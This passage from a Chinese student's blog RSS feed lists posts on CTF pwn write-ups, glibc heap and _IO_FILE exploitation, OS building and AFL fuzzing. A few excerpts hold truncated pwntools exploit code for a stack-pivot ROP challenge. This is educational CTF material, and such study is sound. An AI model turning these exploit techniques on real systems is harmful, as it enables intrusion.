(chuj)</author><guid>https://chujdk.github.io/os/1335.html</guid><description>关于特权级，一直没有理性认知，只知道高特权级才能访问底特权级这样简单的概念，到现在也不敢说学的很懂，只能简单记录一下。 TSS 及其相关的结构 与用户</description></item><item><title>Windows 下用户名为中文造成 pip 无法使用——IDA keypatch 安装引出的问题</title><link>https://chujdk.github.io/mess/1334.html</link><pubDate>Wed, 19 May 2021 19:10:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1334.html</guid><description>这么简单的一个事情花了我半个多小时，想想还是有必要记录一下。 为了之后可能要参与的线下 AWD，准备给我的 IDA 安装一波 keypatch。这个插件依</description></item><item><title>CISCN2021-silverwolf-WP</title><link>https://chujdk.github.io/wp/1333.html</link><pubDate>Wed, 19 May 2021 16:18:56 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1333.html</guid><description>这次 CISCN 可以说是没参赛，只做了分数最低的 pwny，最后 realloc 调 one_gadget 栈的工作也不是我做的（一方面嫌烦另一方面刚准备调学长已经把 exp 写好了）。那题其实就是</description></item><item><title>《操作系统真像还原》操作系统实现——引导内核</title><link>https://chujdk.github.io/os/1330.html</link><pubDate>Tue, 18 May 2021 20:46:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1330.html</guid><description>到现在为止，我们已经进入了保护模式并做好了虚拟地址映射、开启了分页模式，loader 的历史使命也差不多该完成了，现在它需要来引导我们的内核并</description></item><item><title>《操作系统真像还原》操作系统实现——进入分页模式</title><link>https://chujdk.github.io/os/1327.html</link><pubDate>Mon, 17 May 2021 09:51:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1327.html</guid><description>进入保护模式后，我们对内存的访问仍然是基于物理地址的，我们运行的程序，大多是希望自己有一段连续的地址空间的，这样方便寻址。如果使用物理地址来</description></item><item><title>《操作系统真像还原》操作系统实现——进入保护模式</title><link>https://chujdk.github.io/os/1323.html</link><pubDate>Sat, 15 May 2021 18:26:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1323.html</guid><description>之前看完王爽老师的《汇编语言》后本来准备看一下《X86汇编语言：从实模式到保护模式》，但是那本书不是很好读，再加上自己也选择的是 PWN 这个方向，</description></item><item><title>《操作系统真像还原》操作系统实现——MBR</title><link>https://chujdk.github.io/os/1320.html</link><pubDate>Fri, 14 May 2021 22:44:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1320.html</guid><description>最近这段时间准备学一学 OS，《现代操作系统》一书尝试了很多次都没看进去，还是先找一本轻松一点的书来看，尝试一下能不能跟着这本书写一个简单的 OS</description></item><item><title>XCTF 津门杯 2021-PwnCTFM-WP</title><link>https://chujdk.github.io/wp/1317.html</link><pubDate>Tue, 11 May 2021 21:06:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1317.html</guid><description>比赛的时候不知道为什么，一直没想出来，赛后复现一下。 本题、本次比赛，最讨厌的地方就是每道 PWN 题都没给 libc，大幅降低了做题体验（好吧还是我太</description></item><item><title>4 月总结</title><link>https://chujdk.github.io/mess/1314.html</link><pubDate>Sun, 09 May 2021 22:05:52 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1314.html</guid><description>博客近期的更新频率大幅下降了，主要是做不出什么题目，没有 WP 可发，之后应该也只能维持这个更新频率。 4 月份只做了十几道题，给 CTF-WIKI 做了两次 PR，也都</description></item><item><title>AFL学习记录（四）——使用 LAVA-M/BASE64 测试集进行表现测试</title><link>https://chujdk.github.io/fuzzing/1312.html</link><pubDate>Thu, 06 May 2021 16:42:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/fuzzing/1312.html</guid><description>这个测试本来我应该在一个月前完成，但是由于各种各样的原因拖到了现在哈哈哈。 之前一直因为无法完成插桩编译，所以只能用 qemu 模式来整，这个模式就会慢</description></item><item><title>pwn arm 环境——重型解决方案</title><link>https://chujdk.github.io/pwnreview/1303.html</link><pubDate>Sat, 01 May 2021 21:54:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1303.html</guid><description>写在一个月后：这个用法，说实话没什么用，建议不要这么想，光是虚拟机起一下要近十分钟就已经让人无法接受了，而且有各种各样鸡皮的问题，建议通过手</description></item><item><title>Bluehat2021-slient-WP</title><link>https://chujdk.github.io/wp/1302.html</link><pubDate>Thu, 29 Apr 2021 16:28:44 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1302.html</guid><description>这题没啥意思，就是爆破。由于无法输出任何东西，需要有能代表是正确的标志，可以使用 jmp 0 的方法，如果爆破正确则 jmp 0，否则 jmp 到一个乱七八糟的地方造</description></item><item><title>PWNABLE.TW-BREAK OUT-WP</title><link>https://chujdk.github.io/wp/1301.html</link><pubDate>Tue, 27 Apr 2021 21:05:54 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1301.html</guid><description>这道题还是比较刺激的，一开始觉得很简单，直接改 note 指针修改 __free_hook 就行了，结果发现开启了写地址白名单，只允许在堆段上写数据，于是考虑 unsorted bin attack 改白名单，</description></item><item><title>XCTF-sentosa-WP</title><link>https://chujdk.github.io/wp/1298.html</link><pubDate>Sat, 24 Apr 2021 16:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1298.html</guid><description>主要的漏洞点在 这里，当 Input length of your project name: 时输入 0，此处 v2 就会变成 -1，可以栈溢出。 栈环境如下 由于有 canary，有意义的溢出也仅有溢出到 v6。 v6 仅</description></item><item><title>pwn 白名单绕过总结</title><link>https://chujdk.github.io/pwnreview/1294.html</link><pubDate>Thu, 22 Apr 2021 15:37:10 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1294.html</guid><description>有些时候 pwn 题目中为了增加难度（实际是为了恶心选手），会使用类似 seccomp 的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿 shell 是不可能</description></item><item><title>Balsn_CTF_2019-PlainText-WP</title><link>https://chujdk.github.io/wp/1290.html</link><pubDate>Thu, 22 Apr 2021 14:41:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1290.html</guid><description>这道题确实是比较难，卡了很多天，又花了很久才复现出来。 漏洞点分析 程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。 而 free 中</description></item><item><title>PlaidCTF2021-Plaidflix-WP</title><link>https://chujdk.github.io/wp/1289.html</link><pubDate>Mon, 19 Apr 2021 08:55:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1289.html</guid><description>周末两天都在打这个比赛，毕竟是高质量的国际赛，难度确实是有点大，我也只做出了这道比较传统并且简单的题目。 首先是程序的逆向，不知道对 binary 做了什么</description></item><item><title>_IO_FILE 相关源码阅读（二）——vtable 及其指向的函数:__overflow</title><link>https://chujdk.github.io/pwnreview/1288.html</link><pubDate>Fri, 16 Apr 2021 21:22:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1288.html</guid><description>int _IO_new_file_overflow (FILE *f, int ch) { if (f-&amp;gt;_flags &amp;amp; _IO_NO_WRITES) /* SET ERROR */ { f-&amp;gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } /* If currently reading or no buffer allocated. */ if ((f-&amp;gt;_flags &amp;amp; _IO_CURRENTLY_PUTTING) == 0 || f-&amp;gt;_IO_write_base == NULL) { /* Allocate a buffer if needed. */ if (f-&amp;gt;_IO_write_base == NULL) { _IO_doallocbuf (f); _IO_setg (f, f-&amp;gt;_IO_buf_base, f-&amp;gt;_IO_buf_base, f-&amp;gt;_IO_buf_base); } /* Otherwise must be currently reading.</description></item><item><title>BUU-[OGeek2019 Final]OVM-WP</title><link>https://chujdk.github.io/wp/1287.html</link><pubDate>Thu, 15 Apr 2021 22:20:31 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1287.html</guid><description>做的第二道虚拟机类题，此题还算比较简单，因为程序结构很清晰，也贴心的给出了调试信息，可以比较容易读懂程序。读懂程序之后找到漏洞点，利用就比较</description></item><item><title>BUU-ciscn_2019_qual_virtual-WP</title><link>https://chujdk.github.io/wp/1270.html</link><pubDate>Wed, 14 Apr 2021 21:58:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1270.html</guid><description>一道虚拟机 pwn 题，大概是最入门的级别的了，也是此类题型我做的第一道，感觉主要的难点在逆向而非利用，理解程序行为和发现漏洞点后就不难做出了。 逆向</description></item><item><title>hitcon_ctf_2019_lazyhouse-WP</title><link>https://chujdk.github.io/wp/1269.html</link><pubDate>Tue, 13 Apr 2021 23:26:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1269.html</guid><description>hitcon 的题目还是非常有质量且紧跟时代潮流的，在 2019 年连出两道和 libc 2.29 相关的堆利用题，一题是 one_punch，我的 WP，另一题就是就是本题，我并未在</description></item><item><title>PWNABLE.TW-Printable-WP</title><link>https://chujdk.github.io/wp/1265.html</link><pubDate>Mon, 12 Apr 2021 22:17:29 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1265.html</guid><description>相当麻烦的格式化字符串和 .fini 数组利用结合的题目，由于是 pwnable 的题，这里只简单记录一下思路 首先，printf 是很裸的，但是执行完后就会直接 exit，</description></item><item><title>leak 小 trick—— 对 _IO_2_1_stdout_ 的攻击</title><link>https://chujdk.github.io/pwnreview/1259.html</link><pubDate>Sat, 10 Apr 2021 20:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1259.html</guid><description>有一些堆利用菜单题，不提供输出的功能，这个时候即使弄出了一个带有 main_arena 的 chunk，想要直接 leak 也是比较困难的，有些情况下可以通过攻击 _IO_2_1_stdout_ 实现有效的</description></item><item><title>_IO_FILE 相关源码阅读（一）——vtable 及其指向的函数:从 __finish 说起</title><link>https://chujdk.github.io/pwnreview/1171.html</link><pubDate>Sat, 10 Apr 2021 19:02:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1171.html</guid><description>__finish 虚函数主要处理的是对文件结构体的析构操作，同时会根据情况进行对文件进行 close 操作。通过本文的分析，应该可以基本理解 _IO_new_file_f</description></item><item><title>PWNABLE.TW-seethefile-WP</title><link>https://chujdk.github.io/wp/1253.html</link><pubDate>Tue, 06 Apr 2021 14:46:38 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1253.html</guid><description>首先是前置的小 trick：关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出</description></item><item><title>unsorted bin 利用的简单总结</title><link>https://chujdk.github.io/pwnreview/1216.html</link><pubDate>Mon, 05 Apr 2021 22:10:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1216.html</guid><description>学习堆利用也有一段时间了，基本上就是在和 fastbin 和 unsorted bin 打交道，最近这段时间 tcache 的题也做了一些。套路居多，想想还是应该总结一下。不会写的太详细，也可能</description></item><item><title>PWNABLE.TW-Secret Garden-WP</title><link>https://chujdk.github.io/wp/1250.html</link><pubDate>Sun, 04 Apr 2021 11:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1250.html</guid><description>这道题其实很简单，就是 unsorted bin 的 leak 加上一个 house of spirit，我 pwn 它可能主要还是为了减轻不做题的罪恶感。 visit 这个功能可以输出，我们只要释放一个 unsorted bi</description></item><item><title>虎符网络安全赛道参赛有感</title><link>https://chujdk.github.io/pwnreview/1246.html</link><pubDate>Sat, 03 Apr 2021 20:06:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1246.html</guid><description>今天去协会打了 8 个小时的比赛，这也是我第一次跟队参加比赛，还是非常激动的 当然其实与其说是打比赛，不如说是被比赛打。整场比赛就只看了一道 pwn 题，</description></item><item><title>PWNABLE.TW-secret_of_my_heart-WP</title><link>https://chujdk.github.io/wp/1241.html</link><pubDate>Thu, 01 Apr 2021 23:47:03 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1241.html</guid><description>一道堆题，主要的漏洞点是 off-by-one。 可见这里会在读入的字符串末尾加零，那么只要我们申请形如 0x18 的大小的空间，写入 0x18 个字符，就可以溢出</description></item><item><title>3月总结</title><link>https://chujdk.github.io/mess/1236.html</link><pubDate>Wed, 31 Mar 2021 23:11:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1236.html</guid><description>三月的最后一天，复盘一下三月份。 这是开学的第一个月，大一下了，对大学也有了更多的了解，但是似乎在活动方面，还是毫无接触，一方面是没什么活动能</description></item><item><title>PWNABLE.TW-unexploitable-WP</title><link>https://chujdk.github.io/wp/1232.html</link><pubDate>Wed, 31 Mar 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1232.html</guid><description>此题是一个 rop，分数挺高，难度不大。 The original challenge is on pwnable.kr and it is solvable. This time we fix the vulnerability and now we promise that the service is unexploitable. 题目描述是这样的，pwnable.kr 没刷过，也不知</description></item><item><title>PWNABLE.TW-De-ASLR-WP</title><link>https://chujdk.github.io/wp/1227.html</link><pubDate>Tue, 30 Mar 2021 14:53:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1227.html</guid><description>这个 ROP 非常的麻烦 分析 流程就两句话 看起来似乎非常的简单，就是一个 gets 造成的无限溢出。但是并没有任何输出函数，所以 leak 非常困难。 思路 没有任何的 libc 地址</description></item><item><title>BUU-hitcon_ctf_2019_one_punch_man-WP</title><link>https://chujdk.github.io/wp/1226.html</link><pubDate>Sun, 28 Mar 2021 16:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1226.html</guid><description>许久没做题了，今天花了半天的时间学习了一下 Tcache stash unlink attack 这种利用方式，做了一下 hitcon 的这道题。 其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个</description></item><item><title>BUU-hitcon_ctf_2019_one_punch-WP</title><link>https://chujdk.github.io/wp/1226.html</link><pubDate>Sun, 28 Mar 2021 16:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1226.html</guid><description>许久没做题了，今天花了半天的时间学习了一下 Tcache stash unlink attack 这种利用方式，做了一下 hitcon 的这道题。 其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个</description></item><item><title>XCTF-shaxian-WP</title><link>https://chujdk.github.io/wp/1221.html</link><pubDate>Fri, 26 Mar 2021 17:21:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1221.html</guid><description>这道题做出的人很少，本来以为很难，结果一点都不难，但是打不通远程，不出意外应该是靶机的问题。因为本机可以打通，但是远程打不通，为了证明特意去</description></item><item><title>PWNABLE.TW-BookWriter-WP</title><link>https://chujdk.github.io/wp/1217.html</link><pubDate>Wed, 24 Mar 2021 18:53:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1217.html</guid><description>这是一道 house of orange，总体比较明显，比较模板化，但是有一处溢出点藏得比较深。 漏洞点 这里对 size_arr 进行了更新，使用的是 strlen，那么只要我们</description></item><item><title>PWNABLE.TW-Heap Paradise-WP</title><link>https://chujdk.github.io/wp/1214.html</link><pubDate>Tue, 23 Mar 2021 23:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1214.html</guid><description>第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做</description></item><item><title>PWNABLE.TW-Re-alloc Revenge-WP</title><link>https://chujdk.github.io/wp/1210.html</link><pubDate>Sun, 21 Mar 2021 23:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1210.html</guid><description>前段时间做了一道利用 realloc 的题，感觉很有意思。看到此题的名字就有了兴趣，于是花了一天解了一下。 关于 realloc 的特性和攻击 _IO_FILE，本文不再赘述，</description></item><item><title>PWNABLE.TW-Spirited Away-WP</title><link>https://chujdk.github.io/wp/1208.html</link><pubDate>Sat, 20 Mar 2021 21:09:44 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1208.html</guid><description>比较简单的栈溢出加堆溢出。 此处在 cnt &amp;gt;= 100 时有单字节溢出，会把 nbytes 溢出成 n 然后通过此处 修改 buf，使之指向栈上一段可控空间 比如这一段，我们可以轻易</description></item><item><title>PWNABLE.TW-death_note-WP</title><link>https://chujdk.github.io/wp/1204.html</link><pubDate>Sat, 20 Mar 2021 17:05:37 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1204.html</guid><description>漏洞在于数组访问越界和堆栈可执行。在 add_note 函数中输入负数可以修改 got 表，使之指向一段我们可写的地址。自然地可以想到布置 shellcode getshell。然而本题</description></item><item><title>BUU-TWCTF_online_2019_asterisk_alloc-WP</title><link>https://chujdk.github.io/wp/1203.html</link><pubDate>Fri, 19 Mar 2021 13:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1203.html</guid><description>这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记</description></item><item><title>AFL学习记录（三）——qemu 模式的测试</title><link>https://chujdk.github.io/fuzzing/1201.html</link><pubDate>Thu, 18 Mar 2021 14:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/fuzzing/1201.html</guid><description>今天尝试了一下使用 AFL-qemu 的黑盒测试，这里简单记录一下。 首先需要安装，在目录下的 qemu-mode 文件夹中有构建脚本 build_qemu_support.sh，运</description></item><item><title>BUU-rootersctf_2019_heaaaappppp-WP</title><link>https://chujdk.github.io/wp/1195.html</link><pubDate>Wed, 17 Mar 2021 20:56:07 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1195.html</guid><description>此题的起名吸引了我去做它。题目不难，不过之前从来没有做过 Tcache dup 类的利用，也算是学习了新知识（考虑到这和 fastbin double free 相比除了简单不少之外没有什么区别，</description></item><item><title>BUU-sleepyHolder_hitcon_2016-WP</title><link>https://chujdk.github.io/wp/1192.html</link><pubDate>Tue, 16 Mar 2021 20:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1192.html</guid><description>不得不说 hitcon 2016 那场比赛的堆题是真的都很牛叉，让我学到了很多东西。这道题和同场比赛中的 secret_holder 有在总体流程上几乎一样，但是利用方式不同。 这个程序除了 double</description></item><item><title>HgameFINAL-nohook-WP</title><link>https://chujdk.github.io/wp/1183.html</link><pubDate>Sat, 13 Mar 2021 23:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1183.html</guid><description>Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hg</description></item><item><title>XCTF-house_of_grey-WP</title><link>https://chujdk.github.io/wp/1176.html</link><pubDate>Thu, 11 Mar 2021 19:59:53 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1176.html</guid><description>看到题目还以为是堆利用，但是实际上是文件系统中的一个小 trick。 前置的是 /proc 目录的知识，可以看这篇文章 这个知识在 hgame 中第一次碰到，可看这篇 WP 中</description></item><item><title>HITCON-House of Orange-WP</title><link>https://chujdk.github.io/wp/1167.html</link><pubDate>Tue, 09 Mar 2021 23:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1167.html</guid><description>House of Orange 是很有名的一种利用方法，早有耳闻，这次准备研究一下。 quick FAQ Q：为什么我日不穿 XCTF-adword 的靶机！ A：XCTF 提供的 libc 是错的 解决方案：用 LibcSe</description></item><item><title>XCTF-magic-WP</title><link>https://chujdk.github.io/wp/1165.html</link><pubDate>Sun, 07 Mar 2021 19:50:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1165.html</guid><description>这篇 WP 没有写完！！！ 我还没有完成这篇 WP，因为有太多的源码没有研究，建议您看这一篇 写在前面 这道题是一个 _IO_FILE 利用，大概是我做过的最难的一道题，基</description></item><item><title>XCTF/BUU-secret_holder-WP</title><link>https://chujdk.github.io/wp/1161.html</link><pubDate>Sat, 06 Mar 2021 08:22:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1161.html</guid><description>XCTF 提供了莫名其妙的附件，不能解压。所以只好自己找 binary。下载链接 前置知识 这道题出现了 mmap 的情况，这是我之前不曾碰到过的。 红框中申请了一个</description></item><item><title>XCTF-RCalc-WP</title><link>https://chujdk.github.io/wp/1157.html</link><pubDate>Sat, 06 Mar 2021 00:00:10 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1157.html</guid><description>这是一个挺有意思的栈溢出题，很久没做过栈溢出了，居然看了很久才发现漏洞点是栈溢出.. 这里很明显有栈溢出，然后下面的 result = sub_400B92(); if ( result != v2 ) sub_400BD4(); 感觉像</description></item><item><title> XCTF/BUU-4th-QCTF-2018-babyheap-WP</title><link>https://chujdk.github.io/wp/1144.html</link><pubDate>Fri, 05 Mar 2021 14:25:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1144.html</guid><description>3.04 这道题题目给的 libc 是 32 位的，但是程序本身是 64 位的..更令人崩溃的是查不出题目用的 libc，所以我基本是打不穿远程了，但是题目本身还是可以做一</description></item><item><title>AFL学习记录（二）——一次简单的测试</title><link>https://chujdk.github.io/fuzzing/1140.html</link><pubDate>Thu, 04 Mar 2021 19:29:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/fuzzing/1140.html</guid><description>题目做不出来，先来写这篇记录。 昨天把环境搭建好了，今天就拿来简单的进行一次测试。还是使用昨天的代码 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;signal.h&amp;gt; int vuln(char *str) { int len = strlen(str); if(str[0] == &amp;#39;A&amp;#39;</description></item><item><title>AFL学习记录（一）——安装、运行</title><link>https://chujdk.github.io/fuzzing/1138.html</link><pubDate>Wed, 03 Mar 2021 22:47:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/fuzzing/1138.html</guid><description>这是一个崭新的分类。学院为我们安排了科研导师，而我选择了研究安全方向的导师组，其实上个学期期中就选好了，但是由于各种原因当时没有直接开始学，</description></item><item><title>XCTF-shell-WP</title><link>https://chujdk.github.io/wp/1135.html</link><pubDate>Wed, 03 Mar 2021 19:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1135.html</guid><description>一道 8 分题，其实也没多难，就是思路很骚。我没想到，着实可惜。 读入全部使用 gets，随便溢出。我们需要的是把 v16 置为 1，自然的思路是通过溢出实现</description></item><item><title>XCTF-nobug-WP</title><link>https://chujdk.github.io/wp/1134.html</link><pubDate>Tue, 02 Mar 2021 20:27:27 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1134.html</guid><description>这道题的 exp 应该是近期写的最短的，但是却是最令我迷惑的题。 一开始就是一个输入，然后输入的字符串会被传到这个函数里面进行处理 这个函数非常的复杂，</description></item><item><title>XCTF-onemanarmy-WP</title><link>https://chujdk.github.io/wp/1131.html</link><pubDate>Mon, 01 Mar 2021 19:19:45 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1131.html</guid><description>这道题目还算简单，但是乍一看容易懵（反正我懵了）。 首先保护是全开的 分配这里非常的随意，但最多只能分配大小为 0x1FF 的 chunk，libc 版本为 2.</description></item><item><title>XCTF-Noleak-WP</title><link>https://chujdk.github.io/wp/1123.html</link><pubDate>Sun, 28 Feb 2021 21:58:23 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1123.html</guid><description>HCTF-game 终于是结束了，我也没有借口再不做题了，所以从今天开始还是要继续每天一题（尽量吧）。 这道题目比较麻烦，是我做过的和堆相关的最麻烦的一道题。前</description></item><item><title>HGAME2021-WEEK4-PWN-WP</title><link>https://chujdk.github.io/wp/1108.html</link><pubDate>Sun, 28 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1108.html</guid><description>hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。 house_of_cosmos 漏洞点看了很久才看出来 读入函数这里的 i 是 unsigned int，所以当</description></item><item><title>HCTF-game 赛后总结</title><link>https://chujdk.github.io/pwnreview/1116.html</link><pubDate>Sat, 27 Feb 2021 22:37:26 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1116.html</guid><description>这个寒假主要做的事就是打 HCTF-game，毕竟在竞赛方面，并没有准备后路，如果这场比赛出现失误，基本就与竞赛无缘了，这个后果大概是我无法担</description></item><item><title>对大一上的总结</title><link>https://chujdk.github.io/mess/1115.html</link><pubDate>Thu, 25 Feb 2021 20:10:04 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1115.html</guid><description>寒假就快要结束了，我的大一上也算是彻底结束了。这篇文章简单地总结一下。 上学期做的事，总得来说有这几点 基本确定了未来发展的方向 维护了自己的博客</description></item><item><title>HGAME-WEEK3-WP</title><link>https://chujdk.github.io/wp/1100.html</link><pubDate>Sun, 21 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1100.html</guid><description>pwn blackgive 栈迁移，不要想复杂了 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = &amp;#39;debug&amp;#39;) context.terminal = [&amp;#39;tmux&amp;#39;,&amp;#39;splitw&amp;#39;,&amp;#39;-h&amp;#39;] sh = process(&amp;#34;./blackgive&amp;#34;) #sh = remote(&amp;#34;&amp;#34;) libc = ELF(&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;) elf = ELF(&amp;#34;./blackgive&amp;#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = &amp;#39;paSsw0rd&amp;#39;.ljust(0x20,&amp;#39;\x00&amp;#39;) payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&amp;#34;password:&amp;#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = &amp;#39;\x00&amp;#39; * off + p64(pop_rdi_ret)</description></item><item><title>如何利用Unsorted Bin泄露Libc基地址</title><link>https://chujdk.github.io/pwnreview/1089.html</link><pubDate>Tue, 16 Feb 2021 17:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1089.html</guid><description>这其实是一个很简单很枯燥的问题，许多题中都会用到，但是我发现好像并没有文章以该方法为主角介绍该方法，也没有对其原理做出详细解释。估计是大佬们</description></item><item><title>HGAME2021-WEEK3-PWN-WP</title><link>https://chujdk.github.io/wp/1090.html</link><pubDate>Tue, 16 Feb 2021 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1090.html</guid><description>blackgive 栈迁移 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = &amp;#39;debug&amp;#39;) context.terminal = [&amp;#39;tmux&amp;#39;,&amp;#39;splitw&amp;#39;,&amp;#39;-h&amp;#39;] sh = process(&amp;#34;./blackgive&amp;#34;) #sh = remote(&amp;#34;&amp;#34;) libc = ELF(&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;) elf = ELF(&amp;#34;./blackgive&amp;#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = &amp;#39;paSsw0rd&amp;#39;.ljust(0x20,&amp;#39;\x00&amp;#39;) payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&amp;#34;password:&amp;#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = &amp;#39;\x00&amp;#39; * off + p64(pop_rdi_ret) + p64(elf.got[&amp;#39;puts&amp;#39;]) + p64(elf.sym[&amp;#39;puts&amp;#39;]) + p64(0x40070a) sh.sendlineafter(&amp;#34;!\n&amp;#34;,payload) puts_addr</description></item><item><title>HGAME-WEEK2-WP</title><link>https://chujdk.github.io/wp/1078.html</link><pubDate>Sun, 14 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1078.html</guid><description>RE 